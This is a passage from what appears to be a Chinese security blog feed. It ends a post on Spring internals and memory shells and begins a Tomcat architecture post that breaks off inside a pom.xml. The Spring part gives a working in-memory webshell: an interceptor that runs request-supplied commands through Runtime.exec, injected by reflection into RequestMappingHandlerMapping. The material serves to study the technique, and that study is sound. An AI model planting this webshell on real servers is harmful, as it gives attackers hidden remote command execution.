也就是说获取到<code>DispatcherServlet</code>就能获取到它</p><p>看了别的文章, 发现使用的是<code>WebApplicationContext</code>来获取<code>abstractHandlerMapping</code><br>为什么这样? </p><h5 id="WebApplicationContext从何而来-有什么作用"><a href="#WebApplicationContext从何而来-有什么作用" class="headerlink" title="WebApplicationContext从何而来? 有什么作用?"></a><code>WebApplicationContext</code>从何而来? 有什么作用?</h5><p>这里所说的<code>WebApplicationContext</code>是一个接口, 在springboot启动时便有了一个context<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250806222257.png" alt="image.png"><br>也就是<code>AnnotationConfigServletWebServerApplicationContext</code> 这个类是实现了<code>WebApplicationContext</code>接口的<br><code>WebApplicationContext</code>中存放了各种bean, 其中就包括了我们要获取的AbstractHandlerMapping<br>context创建bean的细节见[[Spring Web MVC 框架#bean创建流程]]</p><p>而<code>DispatcherServlet</code>也持有了这个<code>WebApplicationContext</code></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807164313.png" alt="image.png"></p><blockquote><p>在 Spring Boot 之前，<code>DispatcherServlet</code> 自身需要创建一个<strong>子上下文</strong>来管理 Web 层 Bean。但在 Spring Boot 的世界里，这个职责被简化了。</p></blockquote><blockquote><p>现在，<code>DispatcherServlet</code> 的主要任务就是<strong>作为一个请求处理器</strong>。它不再需要自己去创建和管理 Bean，而是<strong>直接使用</strong>那个已经创建好的、包含了所有 Bean 的 <code>AnnotationConfigServletWebServerApplicationContext</code>。</p></blockquote><h5 id="如何获取WebApplicationContext"><a href="#如何获取WebApplicationContext" class="headerlink" title="如何获取WebApplicationContext"></a>如何获取WebApplicationContext</h5><p>按照文章中的说法, 有四种方法：</p><p><strong>1.getCurrentWebApplicationContext</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure><p><code>getCurrentWebApplicationContext</code> 获得的是一个 <code>XmlWebApplicationContext</code> 实例类型的 <code>Root WebApplicationContext</code>。</p><p><strong>2.WebApplicationContextUtils</strong></p><p>_通过这种方法获得的也是一个Root WebApplicationContext。其中 <code>WebApplicationContextUtils.getWebApplicationContext</code> 函数也可以用 WebApplicationContextUtils.getRequiredWebApplicationContext来替换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br></pre></td></tr></table></figure><p><strong>3.RequestContextUtils</strong></p><p>通过<code>ServletRequest</code>类的实例来获得<code>Child WebApplicationContext</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>4.getAttribute</strong></p><p>这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 <code>Child WebApplicationContext</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>先来看getAttribute</p><h6 id="getAttribute获取"><a href="#getAttribute获取" class="headerlink" title="getAttribute获取"></a>getAttribute获取</h6><p>首先是<code>RequestContextHolder.currentRequestAttributes()</code>可以获取当前的请求和响应组成的一个Attributes</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807223530.png" alt="image.png"><br>可以看见它把RequestFacade和ResponeFacade包装在一起了<br>之后可以跟进getAttribute方法</p><p>可以看见第二个参数是0的话就是从requestFacade中获取, 否则从session中获取<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807223742.png" alt="image.png"></p><p>最终是从Request中的attribute中获取, 这个attribute存储了当前请求的上下文信息还有请求的具体信息<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807224017.png" alt="image.png"><br>其中就包括了<code>AnnotationConfigServletWebServerApplicationContext</code>, 这正是我们要拿到的</p><h5 id="获取requestMappingHandlerMapping"><a href="#获取requestMappingHandlerMapping" class="headerlink" title="获取requestMappingHandlerMapping"></a>获取requestMappingHandlerMapping</h5><p>接下来就是从AnnotationConfigServletWebServerApplicationContext管理的众多bean中获取AbstractHandlerMapping<br>虽说是AbstractHandlerMapping, 具体的类实际上是requestMappingHandlerMapping<br>可以看之前的图:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250806163941.png" alt="image.png"></p><p>在beanFactory存储的单例中可以找到:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807225800.png" alt="image.png"><br>我们当然可以反射获取,不过在AnnotationConfigServletWebServerApplicationContext的祖宗类AbstractApplicationContext中实现了getBean方法可以直接获取BeanFactory中的bean<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807230634.png" alt="image.png"></p><h5 id="构造并植入interceptor"><a href="#构造并植入interceptor" class="headerlink" title="构造并植入interceptor"></a>构造并植入interceptor</h5><p>先准备一个简单的恶意拦截器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Interceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                Runtime.getRuntime().exec(cmd);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;  </span><br><span class="line">                n.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后就是反射获取再add进去<br>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"><span class="keyword">package</span> org.example.springdemo.demos.web;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.ContextLoader;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Controller</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicController</span> &#123;  </span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span>  </span><br><span class="line">    <span class="meta">@ResponseBody</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@RequestParam(name = &quot;name&quot;, defaultValue = &quot;unknown user&quot;)</span> String name)</span> &#123;  </span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context1</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();  </span><br><span class="line">        <span class="keyword">if</span> (context1 != <span class="literal">null</span>) &#123;  </span><br><span class="line">            System.out.println(context1.getClass().getName());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context4</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);  </span><br><span class="line">         <span class="keyword">if</span> (context4 != <span class="literal">null</span>) &#123;  </span><br><span class="line">            System.out.println(context4.getClass().getName());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">AbstractHandlerMapping</span> <span class="variable">handlerMapping</span> <span class="operator">=</span> (AbstractHandlerMapping)context4.getBean(RequestMappingHandlerMapping.class);  </span><br><span class="line">         <span class="keyword">if</span> (handlerMapping != <span class="literal">null</span>) &#123;  </span><br><span class="line">            System.out.println(handlerMapping.getClass().getName());  </span><br><span class="line">         &#125;  </span><br><span class="line">  </span><br><span class="line">         <span class="keyword">try</span> &#123;  </span><br><span class="line">             <span class="type">Shell_Interceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Interceptor</span>();  </span><br><span class="line">  </span><br><span class="line">             <span class="type">Class</span> <span class="variable">abstractHandlerMappingClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMapping&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">             <span class="type">Field</span> <span class="variable">adaptedInterceptorsField</span> <span class="operator">=</span> abstractHandlerMappingClazz.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);  </span><br><span class="line">             adaptedInterceptorsField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">             List&lt;HandlerInterceptor&gt; adaptedInterceptors = (List&lt;HandlerInterceptor&gt;) adaptedInterceptorsField.get(handlerMapping);  </span><br><span class="line">             adaptedInterceptors.add(interceptor);  </span><br><span class="line">  </span><br><span class="line">         &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">             e.printStackTrace();  </span><br><span class="line">         &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Interceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;n4c1&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    Runtime.getRuntime().exec(cmd);  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">                    e.printStackTrace();  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;  </span><br><span class="line">                    n.printStackTrace();  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807232908.png" alt="image.png"></p><h3 id="Spring-WebFlux-框架"><a href="#Spring-WebFlux-框架" class="headerlink" title="Spring WebFlux 框架"></a>Spring WebFlux 框架</h3><p>[[Spring WebFlux 框架]]</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://juejin.cn/post/7214831216028745783#heading-4">https://juejin.cn/post/7214831216028745783#heading-4</a><br><a href="https://xz.aliyun.com/news/18301">从零掌握java内存马大全（基于LearnJavaMemshellFromZero复现重组）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Spring架构原理-Spring内存马&quot;&gt;&lt;a href=&quot;#Spring架构原理-Spring内存马&quot; class=&quot;headerlink&quot; title=&quot;Spring架构原理 &amp;amp; Spring内存马&quot;&gt;&lt;/a&gt;Spring架构原理 &amp;amp; Spr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Tomcat 架构原理 &amp; Tomcat内存马</title>
    <link href="http://example.com/2025/09/10/Tomcat-%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://example.com/2025/09/10/Tomcat-%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2025-09-10T06:38:59.000Z</published>
    <updated>2025-09-10T06:39:49.042Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat-架构原理-Tomcat内存马"><a href="#Tomcat-架构原理-Tomcat内存马" class="headerlink" title="Tomcat 架构原理 &amp; Tomcat内存马"></a>Tomcat 架构原理 &amp; Tomcat内存马</h1><p>先阅读<br><a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09"># Tomcat 架构原理解析到架构设计借鉴</a></p><p><strong>Tomcat 设计了两个核心组件连接器（Connector）和容器（Container）。连接器负责对外交流，容器负责内部 处理</strong></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722011346.png" alt="image.png"></p><h3 id="连接器结构"><a href="#连接器结构" class="headerlink" title="连接器结构"></a>连接器结构</h3><p>连接器又分为两部分 &#x3D;&#x3D;<code>ProtocolHandler</code>&#x3D;&#x3D;和&#x3D;&#x3D;<code>Adapter</code>&#x3D;&#x3D;<br>其中&#x3D;&#x3D;<code>ProtocolHandler</code>&#x3D;&#x3D;负责与&#x3D;&#x3D;socket&#x3D;&#x3D;交互并将数据转换为其转换为&#x3D;&#x3D;<code>Tomcat Request</code>&#x3D;&#x3D;或&#x3D;&#x3D;<code>Tomcat Respone</code>&#x3D;&#x3D;<br>由于这并不是标准的Servlet请求或响应, tomcat在设计时使用&#x3D;&#x3D;<code>Adapter</code>&#x3D;&#x3D;来将  &#x3D;&#x3D;<code>Tomcat Request</code>&#x3D;&#x3D;或&#x3D;&#x3D;<code>Tomcat Respone</code> &#x3D;&#x3D;转换为标准的&#x3D;&#x3D;<code>Servlet Request</code>&#x3D;&#x3D;或&#x3D;&#x3D;<code>Servlet Respone</code>&#x3D;&#x3D;</p><h4 id="ProtocolHandler"><a href="#ProtocolHandler" class="headerlink" title="ProtocolHandler"></a><code>ProtocolHandler</code></h4><p>&#x3D;&#x3D;<code>ProtocolHandler</code>&#x3D;&#x3D;又包含了&#x3D;&#x3D;<code>EndedPoint</code>&#x3D;&#x3D;和&#x3D;&#x3D;<code>Processor</code>&#x3D;&#x3D;这两部分<br><code>EndPoint</code>是通信端点，即通信监听的接口，是具体的&#x3D;&#x3D;Socket &#x3D;&#x3D;接收和发送处理器，是对传输层的抽象，因此 <code>EndPoint</code>是用来实现 <code>TCP/IP</code> 协议数据读写的，本质调用操作系统的 socket 接口。<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250720234251.png" alt="image.png"></p><h5 id="EndPoint"><a href="#EndPoint" class="headerlink" title="EndPoint"></a><code>EndPoint</code></h5><p>&#x3D;&#x3D;<code>EndPoint</code>&#x3D;&#x3D;是通信端点，即&#x3D;&#x3D;通信监听的接口&#x3D;&#x3D;，是具体的 Socket 接收和发送处理器，是对传输层的抽象，因此 <code>EndPoint</code>是用来实现 <code>TCP/IP</code> 协议数据读写的，本质调用操作系统的 socket 接口。<br>其工作流程如下图<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722012456.png" alt="image.png"></p><h5 id="Proccessor"><a href="#Proccessor" class="headerlink" title="Proccessor"></a><code>Proccessor</code></h5><p>Processor 用来实现 HTTP 协议，Processor 接收来自 <code>EndPoint</code>的 <code>Socket</code>，读取字节流解析成 Tomcat <code>Request</code>和 <code>Response</code>对象，并通过 <code>Adapter</code>将其提交到容器处理，<code>Processor</code>是对应用层协议的抽象。</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250720234159.png" alt="image.png"></p><h4 id="Adapter"><a href="#Adapter" class="headerlink" title="Adapter"></a>Adapter</h4><p>由于协议的不同，Tomcat 定义了自己的 <code>Request</code> 类来存放请求信息，这里其实体现了面向对象的思维。但是这个 Request 不是标准的 <code>ServletRequest</code> ，所以不能直接使用 Tomcat 定义 Request 作为参数直接容器。</p><p>Tomcat 设计者的解决方案是引入 <code>CoyoteAdapter</code>，这是适配器模式的经典运用，<code>Acceptor</code>监听连接生成 <code>SocketProcessor</code> 调用 <code>CoyoteAdapter</code> 的 <code>Sevice</code> 方法，传入的是 <code>Tomcat Request</code> 对象，<code>CoyoteAdapter</code>负责将 <code>Tomcat Request</code> 转成 <code>ServletRequest</code>，再调用容器的 <code>Service</code>方法</p><h3 id="Servlet容器结构"><a href="#Servlet容器结构" class="headerlink" title="Servlet容器结构"></a>Servlet容器结构</h3><p>具体结构如下<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250720162109.png" alt="image.png"></p><p>一个 &#x3D;&#x3D;Service&#x3D;&#x3D; 只能有 一个 &#x3D;&#x3D;<code>Engine</code>&#x3D;&#x3D;, 一个 &#x3D;&#x3D;<code>Engine</code>&#x3D;&#x3D;可以管理多个站点(&#x3D;&#x3D;Host&#x3D;&#x3D;),  一个站点有多个&#x3D;&#x3D;<code>Context</code>&#x3D;&#x3D;(url路径), 一个context下可以有多个&#x3D;&#x3D;<code>servlet</code>&#x3D;&#x3D;, <code>Wrapper</code> 表示一个 <code>Servlet</code><br>为了方便, tomcat使用[[组合模式]]来管理只有一个具有父子关系地树形结构, 具体是: <strong>所有容器组件都实现了 <code>Container</code>接口，因此组合模式可以使得用户对单容器对象和组合容器对象的使用具有一致性</strong>。这里单容器对象指的是最底层的 <code>Wrapper</code>，组合容器对象指的是上面的 <code>Context</code>、<code>Host</code>或者 <code>Engine</code>。<code>Container</code> 接口定义如下：<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722013756.png" alt="image.png"></p><h5 id="Lifecycle-生命周期"><a href="#Lifecycle-生命周期" class="headerlink" title="Lifecycle 生命周期"></a>Lifecycle 生命周期</h5><p><code>Container</code>接口还继承了&#x3D;&#x3D;Lifecycle&#x3D;&#x3D;,Tomcat 就是通过 <code>Lifecycle</code> 统一管理所有容器的组件的&#x3D;&#x3D;生命周期&#x3D;&#x3D;。通过组合模式管理所有容器，拓展 <code>Lifecycle</code> 实现对每个组件的生命周期管理 ，<code>Lifecycle</code> 主要包含的方法&#x3D;&#x3D;<code>init()、start()、stop() 和 destroy()</code>&#x3D;&#x3D;。这样当一个<code>Context</code>, 其下面的wrapper也会被关闭</p><p>此外 因为各个组件<code>init()</code> 和 <code>start()</code> 方法的具体实现是复杂多变的，比如在 Host 容器的启动方法里需要扫描 webapps 目录下的 Web 应用，创建相应的 Context 容器,  如果下次有需要加入新的逻辑, 直接修改<code>init()</code> 和 <code>start()</code> 方法的话就会违背&#x3D;&#x3D;开闭原则&#x3D;&#x3D;, 因此tomcat采用[[观察者模式]]来解决这一问题<br>以下就是 <code>Lyfecycle</code> 接口的定义:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722014620.png" alt="image.png"></p><p>此外 Tomcat 定义一个基类 &#x3D;&#x3D;<code>LifeCycleBase</code>&#x3D;&#x3D; 来实现<code> LifeCycle</code> 接口，把一些&#x3D;&#x3D;公共的逻辑&#x3D;&#x3D;放到基类中去，比如&#x3D;&#x3D;生命状态的转变与维护&#x3D;&#x3D;、&#x3D;&#x3D;生命事件的触发以及监听器的添加和删除&#x3D;&#x3D;等，而子类就负责实现自己的&#x3D;&#x3D;初始化&#x3D;&#x3D;、&#x3D;&#x3D;启动和停止等方法&#x3D;&#x3D;。<br>典型的&#x3D;&#x3D;抽象模板设计模式&#x3D;&#x3D;<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722014824.png" alt="image.png"></p><p>总体设计图<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722015102.png" alt="image.png"></p><h3 id="Tomcat启动流程"><a href="#Tomcat启动流程" class="headerlink" title="Tomcat启动流程"></a>Tomcat启动流程</h3><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722014956.png" alt="image.png"></p><ul><li>Tomcat 本生就是一个 Java 程序，所以 startup.sh 脚本就是启动一个 JVM 来运行 Tomcat 的启动类 Bootstrap。</li><li>Bootstrap 主要就是实例化 Catalina 和初始化 Tomcat 自定义的类加载器。热加载与热部署就是靠他实现。</li><li>Catalina: 解析 server.xml 创建 Server 组件，并且调用 Server.start() 方法。</li><li>Server：管理 Service 组件，调用 Service 的 start() 方法。</li><li>Service：主要职责就是管理顶层容器 Engine，分别调用 <code>Connector</code> 和 <code>Engine</code> 的 <code>start</code> 方法。</li></ul><h4 id="init流程"><a href="#init流程" class="headerlink" title="init流程"></a>init流程</h4><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722144446.png" alt="image.png"></p><h4 id="start流程"><a href="#start流程" class="headerlink" title="start流程"></a>start流程</h4><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722144529.png" alt="image.png"></p><h4 id="源码调试"><a href="#源码调试" class="headerlink" title="源码调试"></a>源码调试</h4><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span>  </span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servletMemoryShell<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span>        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  